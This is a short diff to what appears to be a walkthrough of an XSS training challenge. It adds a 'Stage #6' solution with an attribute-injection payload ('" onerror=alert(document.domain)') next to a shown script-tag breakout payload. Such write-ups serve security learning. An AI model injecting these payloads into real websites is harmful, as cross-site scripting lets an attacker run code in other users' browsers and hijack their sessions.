@@ -29,3 +29,7 @@ Then use this payload in that input field:
 "><script>alert(document.domain)</script>//
 ```
 
+## Stage #6
+Use this payload: `" onerror=alert(document.domain)`
+Click the search button. Then click the input field again. SOLVED!
+
